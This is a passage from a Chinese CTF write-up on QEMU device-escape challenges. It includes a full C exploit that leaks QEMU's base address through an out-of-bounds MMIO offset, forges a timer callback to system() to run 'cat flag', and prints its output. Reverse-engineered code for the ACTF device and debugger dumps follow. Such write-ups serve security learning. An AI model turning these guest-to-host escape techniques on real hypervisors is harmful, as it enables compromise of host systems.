class="number">0x0000555c4b8bbeed</span></span><br></pre></td></tr></table></figure>

<p>exp脚本</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// clang-format off</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;complex.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="comment">// clang-format on</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_GREEN <span class="string">&quot;\033[32m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_RED <span class="string">&quot;\033[31m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_DEFAULT <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DMSG(fmt, ...)                                                         \</span></span><br><span class="line"><span class="meta">  fprintf(stderr, <span class="string">&quot;[*] %s\t&quot;</span> fmt <span class="string">&quot;\n&quot;</span>, __FILE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMSG(fmt, ...)                                                         \</span></span><br><span class="line"><span class="meta">  fprintf(stderr, COLOR_GREEN <span class="string">&quot;[+] %s\t&quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,     \</span></span><br><span class="line"><span class="meta">          ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EMSG(fmt, ...)                                                         \</span></span><br><span class="line"><span class="meta">  fprintf(stderr, COLOR_RED <span class="string">&quot;[-] %s\t&quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,       \</span></span><br><span class="line"><span class="meta">          ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fatal(fmt, ...)                                                        \</span></span><br><span class="line"><span class="meta">  do &#123;                                                                         \</span></span><br><span class="line"><span class="meta">    EMSG(fmt, ##__VA_ARGS__);                                                  \</span></span><br><span class="line"><span class="meta">    exit(EXIT_FAILURE);                                                        \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">debug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;=============\tDEBUG\t=========&quot;</span>);</span><br><span class="line">  <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">mmio_readl</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> *((<span class="type">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint64_t</span> <span class="title">mmio_readll</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> high = <span class="built_in">mmio_readl</span>(addr + <span class="number">4</span>);</span><br><span class="line">  <span class="type">uint64_t</span> low = <span class="built_in">mmio_readl</span>(addr);</span><br><span class="line">  <span class="keyword">return</span> (high &lt;&lt; <span class="number">32</span>) | (low &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">mmio_writel</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">  *(<span class="type">uint32_t</span> *)(mmio_mem + addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">mmio_writell</span><span class="params">(<span class="type">uint64_t</span> off, <span class="type">uint64_t</span> value)</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> high, low;</span><br><span class="line">  low = (off &lt;&lt; <span class="number">32</span>) | (value &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(mmio_mem + <span class="number">0x20</span>) = low;</span><br><span class="line">  high = ((off + <span class="number">4</span>) &lt;&lt; <span class="number">32</span>) | (value &gt;&gt; <span class="number">32</span>);</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(mmio_mem + <span class="number">0x20</span>) = high;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">set_off</span><span class="params">(<span class="type">int32_t</span> off)</span> </span>&#123; <span class="built_in">mmio_writel</span>(<span class="number">0x10</span>, off); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mmio_setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> fd =</span><br><span class="line">      <span class="built_in">open</span>(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">fatal</span>(<span class="string">&quot;Error open resource0&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  mmio_mem = <span class="built_in">mmap</span>(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">    <span class="built_in">fatal</span>(<span class="string">&quot;Error mmap fd&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> ret = <span class="number">0</span>;</span><br><span class="line">  <span class="type">uint64_t</span> elf_base;</span><br><span class="line">  <span class="type">uint64_t</span> vn_mmio_ops;</span><br><span class="line">  <span class="type">uint64_t</span> main_loop_tlg;</span><br><span class="line">  <span class="type">uint64_t</span> qemu_time_list1;</span><br><span class="line">  <span class="type">uint64_t</span> opaque;</span><br><span class="line">  <span class="type">uint64_t</span> opaque_buf;</span><br><span class="line">  <span class="type">uint64_t</span> system_fptr;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Prepare mmio...&quot;</span>);</span><br><span class="line">  <span class="built_in">mmio_setup</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Leaking elf base...&quot;</span>);</span><br><span class="line">  <span class="built_in">set_off</span>(<span class="number">-0xC0</span>);</span><br><span class="line">  vn_mmio_ops = <span class="built_in">mmio_readll</span>(<span class="number">0x20</span>);</span><br><span class="line">  elf_base = vn_mmio_ops - <span class="number">0xf581e0</span>;</span><br><span class="line">  main_loop_tlg = elf_base + <span class="number">0x14b9480</span>;</span><br><span class="line">  system_fptr = elf_base + <span class="number">0x312040</span>;</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;elf_base : %#lx&quot;</span>, elf_base);</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;main_loop_tlg : %#lx&quot;</span>, main_loop_tlg);</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;system func : %#lx&quot;</span>, system_fptr);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Leaking opaque addr...&quot;</span>);</span><br><span class="line">  <span class="built_in">set_off</span>(<span class="number">-0xC0</span> + <span class="number">8</span>);</span><br><span class="line">  opaque = <span class="built_in">mmio_readll</span>(<span class="number">0x20</span>);</span><br><span class="line">  opaque_buf = opaque + <span class="number">0xb40</span>;</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;opaque : %#lx&quot;</span>, opaque);</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;opaque_buf : %#lx&quot;</span>, opaque_buf);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Leak QemuTimerListGroup[1]...&quot;</span>);</span><br><span class="line">  <span class="built_in">set_off</span>(main_loop_tlg - opaque_buf + <span class="number">0x8</span>);</span><br><span class="line">  qemu_time_list1 = <span class="built_in">mmio_readll</span>(<span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;qemu_time_list1 : %#lx&quot;</span>, qemu_time_list1);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Make fake QEMUTimer in opaque buf....&quot;</span>);</span><br><span class="line">  <span class="comment">// struct QEMUTimerListGroup &#123;</span></span><br><span class="line">  <span class="comment">//   QEMUTimerList *tl[QEMU_CLOCK_MAX];</span></span><br><span class="line">  <span class="comment">// &#125;;</span></span><br><span class="line">  <span class="comment">// struct QEMUTimerList &#123;</span></span><br><span class="line">  <span class="comment">//   QEMUClock *clock;</span></span><br><span class="line">  <span class="comment">//   QemuMutex active_timers_lock;</span></span><br><span class="line">  <span class="comment">//   QEMUTimer *active_timers;        // 0x48 : change to opaque_buf</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// struct QEMUTimer &#123;</span></span><br><span class="line">  <span class="comment">//   int64_t expire_time;</span></span><br><span class="line">  <span class="comment">//   QEMUTimerList *timer_list;</span></span><br><span class="line">  <span class="comment">//   QEMUTimerCB *cb;                  // 0x10: change to system func ptr</span></span><br><span class="line">  <span class="comment">//   void *opaque;                     // 0x18: change to cmd</span></span><br><span class="line">  <span class="comment">//   QEMUTimer *next;</span></span><br><span class="line">  <span class="comment">//   int attributes;</span></span><br><span class="line">  <span class="comment">//   int scale;</span></span><br><span class="line">  <span class="comment">// &#125;;</span></span><br><span class="line">  <span class="type">uint64_t</span> fake_qemu_timer = opaque_buf;</span><br><span class="line">  <span class="type">uint64_t</span> cmd_ptr = opaque_buf + <span class="number">0x30</span>;</span><br><span class="line">  <span class="built_in">mmio_writell</span>(<span class="number">0x8</span>, qemu_time_list1);</span><br><span class="line">  <span class="built_in">mmio_writell</span>(<span class="number">0x10</span>, system_fptr);</span><br><span class="line">  <span class="built_in">mmio_writell</span>(<span class="number">0x18</span>, cmd_ptr);</span><br><span class="line">  <span class="comment">// &quot;/bin/sh&quot; 0x0068732f6e69622f 卡死</span></span><br><span class="line">  <span class="built_in">mmio_writell</span>(<span class="number">0x30</span>, <span class="number">0x67616c6620746163</span>); <span class="comment">// &quot;cat flag&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Change QemuTimerListGroup[1] to opaque buf&quot;</span>);</span><br><span class="line">  <span class="built_in">set_off</span>(qemu_time_list1 - fake_qemu_timer + <span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">mmio_writel</span>(<span class="number">0x30</span>, fake_qemu_timer);</span><br><span class="line">  <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行函数成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ <span class="comment"># ./exp</span></span><br><span class="line">[+] exp.c       Prepare mmio...</span><br><span class="line">[+] exp.c       Leaking elf base...</span><br><span class="line">[*] exp.c       elf_base : 0x55e4c481e000</span><br><span class="line">[*] exp.c       main_loop_tlg : 0x55e4c5cd7480</span><br><span class="line">[*] exp.c       system func : 0x55e4c4b30040</span><br><span class="line">[+] exp.c       Leaking opaque addr...</span><br><span class="line">[*] exp.c       opaque : 0x55e4c89d3c30</span><br><span class="line">[*] exp.c       opaque_buf : 0x55e4c89d4770</span><br><span class="line">[+] exp.c       Leak QemuTimerListGroup[1]...</span><br><span class="line">[*] exp.c       qemu_time_list1 : 0x55e4c79f5840</span><br><span class="line">[+] exp.c       Make fake QEMUTimer <span class="keyword">in</span> opaque buf....</span><br><span class="line">flag&#123;vnctf2024-test&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit 2"></a>Exploit 2</h3><p>net_bridge_run_helper函数存在一个execv(“&#x2F;bin&#x2F;sh”)</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000674291</span>                 lea     rax, [rbp+argv]</span><br><span class="line">.text:<span class="number">0000000000674298</span>                 mov     rsi, rax        ; argv</span><br><span class="line">.text:<span class="number">000000000067429B</span>                 lea     rax, aBinSh_0   ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">00000000006742</span>A2                 mov     rdi, rax        ; path</span><br><span class="line">.text:<span class="number">00000000006742</span>A5                 call    _execv</span><br></pre></td></tr></table></figure>

<p>修改MemoryRegion的结构体中的ops劫持控制流🫢！对于 MMIO 而言read&#x2F;write最终调用<code>ops-&gt;read()</code> 或 <code>ops-&gt;write()</code></p>
<h2 id="ACTF2023-qemu-playground"><a href="#ACTF2023-qemu-playground" class="headerlink" title="ACTF2023 qemu playground"></a>ACTF2023 qemu playground</h2><p>逆向<a href="https://hanqi-blogs.cn/2023/ACTF-2023%20QemuPlayground/">(3)</a> &amp;&amp; PWN</p>
<p>下载题目：<a href="https://github.com/team-s2/ACTF-2023">team-s2&#x2F;ACTF-2023</a></p>
<p>启动脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">timeout</span> --foreground 300 ./qemu-system-x86_64 \</span><br><span class="line">    -device actf \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -L ./pc-bios \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0&quot;</span> \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -nographic \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -monitor /dev/null</span><br></pre></td></tr></table></figure>

<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>使用IDA打开，<strong>直接搜索字符串，可以找到actf</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.rodata:<span class="number">000000000098B</span>9FB	<span class="number">0000000</span>A	C	actf-mmio</span><br><span class="line">.rodata:<span class="number">000000000098B</span>A05	<span class="number">0000000</span>A	C	actf-pmio</span><br></pre></td></tr></table></figure>

<p>交叉引用，可以找到 realize 函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *__fastcall <span class="title">actf_class_init</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ***objectClass)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">void</span> *devClass; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *pciDevClass; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  devClass = (<span class="type">void</span> *)<span class="built_in">object_class_dynamic_cast_assert</span>(</span><br><span class="line">                       objectClass,</span><br><span class="line">                       <span class="string">&quot;device&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;/home/esifiel/qemu/include/hw/qdev-core.h&quot;</span>,</span><br><span class="line">                       <span class="number">0x4D</span>u,</span><br><span class="line">                       <span class="string">&quot;DEVICE_CLASS&quot;</span>);</span><br><span class="line">  pciDevClass = (<span class="type">void</span> *)<span class="built_in">object_class_dynamic_cast_assert</span>(</span><br><span class="line">                          objectClass,</span><br><span class="line">                          <span class="string">&quot;pci-device&quot;</span>,</span><br><span class="line">                          <span class="string">&quot;/home/esifiel/qemu/include/hw/pci/pci_device.h&quot;</span>,</span><br><span class="line">                          <span class="number">9u</span>,</span><br><span class="line">                          <span class="string">&quot;PCI_DEVICE_CLASS&quot;</span>);</span><br><span class="line">  *((_QWORD *)pciDevClass + <span class="number">22</span>) = pci_actf_realize;</span><br><span class="line">  *((_DWORD *)pciDevClass + <span class="number">52</span>) = <span class="number">0xAC7F1234</span>;   <span class="comment">// classid:vendorid</span></span><br><span class="line">  *((_BYTE *)pciDevClass + <span class="number">212</span>) = <span class="number">0x10</span>;         <span class="comment">// reversion</span></span><br><span class="line">  *((_WORD *)pciDevClass + <span class="number">107</span>) = <span class="number">0xFF</span>;         <span class="comment">// class id</span></span><br><span class="line">  *((_QWORD *)devClass + <span class="number">12</span>) |= <span class="number">0x80</span>uLL;</span><br><span class="line">  <span class="keyword">return</span> pciDevClass;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">pci_actf_realize</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****object)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****actfState; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// r13</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  actfState = <span class="built_in">object_dynamic_cast_assert</span>(object, <span class="string">&quot;actf&quot;</span>, <span class="string">&quot;../hw/misc/actfdev.c&quot;</span>, <span class="number">0x24</span>u, <span class="string">&quot;ACTF&quot;</span>);</span><br><span class="line">  v2 = (__int64)(actfState + <span class="number">336</span>);</span><br><span class="line">  v3 = (__int64)actfState;</span><br><span class="line">  <span class="built_in">memory_region_init_io</span>(</span><br><span class="line">    (__int64)(actfState + <span class="number">336</span>),</span><br><span class="line">    (__int64)actfState,</span><br><span class="line">    &amp;mmio_ops,</span><br><span class="line">    (__int64)actfState,</span><br><span class="line">    (__int64)<span class="string">&quot;actf-mmio&quot;</span>,</span><br><span class="line">    <span class="number">4096LL</span>);</span><br><span class="line">  <span class="built_in">pci_register_bar</span>((__int64)object, <span class="number">0</span>, <span class="number">0</span>, v2);</span><br><span class="line">  <span class="built_in">memory_region_init_io</span>(v3 + <span class="number">2960</span>, v3, &amp;pmio_ops, v3, (__int64)<span class="string">&quot;actf-pmio&quot;</span>, <span class="number">32LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">pci_register_bar</span>((__int64)object, <span class="number">1</span>, <span class="number">1u</span>, v3 + <span class="number">2960</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mmio_read&#x2F;write：rdi一般为一个void类型指针，一般会强转为自定义的PCIDevice。一个buffer数组，读写4个字节。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">actf_mmio_read</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; addr &lt;= <span class="number">0x40</span> )</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">int</span> *)(opaque + addr + <span class="number">0xA38</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">actf_mmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">int</span> val, <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x20</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">0x40</span> )</span><br><span class="line">        *(_DWORD *)(opaque + addr + <span class="number">0xA38</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(opaque + addr + <span class="number">0xA38</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pmio_read&#x2F;write，write创建一个线程，启动一个函数，在这里重命名为 xxxx。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">actf_pmio_read</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****opaque, <span class="type">unsigned</span> __int64 addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// r8</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">object_dynamic_cast_assert</span>(opaque, <span class="string">&quot;actf&quot;</span>, <span class="string">&quot;../hw/misc/actfdev.c&quot;</span>, <span class="number">0x24</span>u, <span class="string">&quot;ACTF&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">unsigned</span> __int8 *)v2 + <span class="number">0xA31</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">unsigned</span> __int8 *)v2 + <span class="number">0xA30</span>);</span><br><span class="line">  v3 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr - <span class="number">16</span> &gt; <span class="number">0xF</span> || !*((_BYTE *)v2 + <span class="number">0xA31</span>) )</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">char</span> *)v2[<span class="number">335</span>] + (addr &amp; <span class="number">0xF</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">actf_pmio_write</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****v4; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r9d</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">object_dynamic_cast_assert</span>(opaque, <span class="string">&quot;actf&quot;</span>, <span class="string">&quot;../hw/misc/actfdev.c&quot;</span>, <span class="number">0x24</span>u, <span class="string">&quot;ACTF&quot;</span>);</span><br><span class="line">  <span class="built_in">off_11BB7F0</span>(v4 + <span class="number">405</span>, <span class="string">&quot;../hw/misc/actfdev.c&quot;</span>, <span class="number">116LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_BYTE *)v4 + <span class="number">0xA30</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)v4 + <span class="number">2608</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">qemu_thread_create</span>((<span class="type">pthread_t</span> *)v4 + <span class="number">404</span>, (__int64)<span class="string">&quot;actf-worker-thread&quot;</span>, (__int64)sub_409F40, (__int64)v4, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr - <span class="number">16</span> &lt;= <span class="number">0xF</span> &amp;&amp; *((_BYTE *)v4 + <span class="number">2609</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = (__int64)v4[<span class="number">335</span>];</span><br><span class="line">      <span class="keyword">if</span> ( !v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = <span class="built_in">g_malloc</span>(<span class="number">32LL</span>);</span><br><span class="line">        v4[<span class="number">335</span>] = (<span class="type">const</span> <span class="type">char</span> ***)v9;</span><br><span class="line">      &#125;</span><br><span class="line">      *(_DWORD *)(v9 + (addr &amp; <span class="number">0xF</span>)) = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *((_BYTE *)v4 + <span class="number">2608</span>) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">qemu_mutex_unlock</span>((<span class="type">pthread_mutex_t</span> *)v4 + <span class="number">81</span>, (<span class="type">int</span>)<span class="string">&quot;../hw/misc/actfdev.c&quot;</span>, <span class="number">0x8B</span>u, v5, v6, v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看相关配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ <span class="comment"># lspci</span></span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:ac7f</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line"></span><br><span class="line">~ <span class="comment"># cat /sys/devices/pci0000:00/0000:00:04.0/resource</span></span><br><span class="line">0x00000000febf1000 0x00000000febf1fff 0x0000000000040200</span><br><span class="line">0x000000000000c040 0x000000000000c05f 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>重新打包cpio文件，尽量不覆盖原来的文件，我们改个名，使用makefile自动化</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CC := gcc</span><br><span class="line">CFLAGS := -no-pie -static</span><br><span class="line">SRC := exp.c</span><br><span class="line">TARGET := exp</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(SRC)</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line">	strip <span class="variable">$@</span></span><br><span class="line">	find . | cpio -ov --format=newc  | gzip -9 &gt; ../rootfs.cpio.gz</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure>

<p>mmio_read&#x2F;write：读写 0xa38 附近的内容0x0~0x44，读取一下，暂时没发现有用的地方，查看pmio_read 0xa30区域和 ActfState。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="variable">$rdi</span>+<span class="variable">$rsi</span>+0xa38</span><br><span class="line"><span class="variable">$3</span> = 0x56327d1bc568</span><br><span class="line">pwndbg&gt; tele 0x56327d1bc568</span><br><span class="line">00:0000│  0x56327d1bc568 ◂— 0x0</span><br><span class="line">... ↓     7 skipped</span><br><span class="line">pwndbg&gt; tele 0x56327d1bc568-0xa38+0xa30</span><br><span class="line">00:0000│  0x56327d1bc560 ◂— 0x1234ac7f00000000</span><br><span class="line">01:0008│  0x56327d1bc568 ◂— 0x0</span><br><span class="line">... ↓     6 skipped</span><br><span class="line">pwndbg&gt; tele 0x56327d1bc568-0xa38</span><br><span class="line">00:0000│ rdi 0x56327d1bbb30 —▸ 0x56327c433850 —▸ 0x56327c1888d0 —▸ 0x56327c156b10 ◂— 0x560066746361 /* <span class="string">&#x27;actf&#x27;</span> */</span><br><span class="line">01:0008│     0x56327d1bbb38 —▸ 0x7ff383e92d50 (g_free) ◂— endbr64</span><br><span class="line">02:0010│     0x56327d1bbb40 —▸ 0x56327d1b86a0 ◂— 0x8</span><br><span class="line">03:0018│     